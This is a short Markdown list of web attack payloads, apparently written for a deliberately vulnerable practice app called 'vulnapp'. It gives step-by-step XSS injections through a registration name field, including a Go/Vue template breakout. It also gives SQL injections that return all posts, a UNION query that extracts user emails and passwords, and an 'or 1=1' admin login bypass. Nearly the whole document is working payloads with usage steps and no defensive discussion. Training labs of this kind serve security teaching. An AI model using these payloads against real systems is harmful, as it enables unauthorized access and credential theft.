
# Payloads

## XSS

### Not escape register name
1. register with insert XSS code(' );<script>alert(***)</script> -- ') Name form
2. and Login page, login with mail and pass
3. Rendering login user name in template, so occur XSS

### Golang (and Vue) html template Basic 
1. register with insert XSS code ( '}}<script>alert(1)</script>{{' ) Name form

## SQL Injection

### Get all posts
1. open timeline
2. search timeline use `%" or 1=1; --`

### Get UserID and Passwd using Union
1. open timeline
2. search post use `" union select mail,passwd from vulnapp.user ;`

### Bypass Authentication
1. open admin login page
2. Input ` " or 1=1; -- ` into Mail-address form
3. Input random word into password form
4. Enter
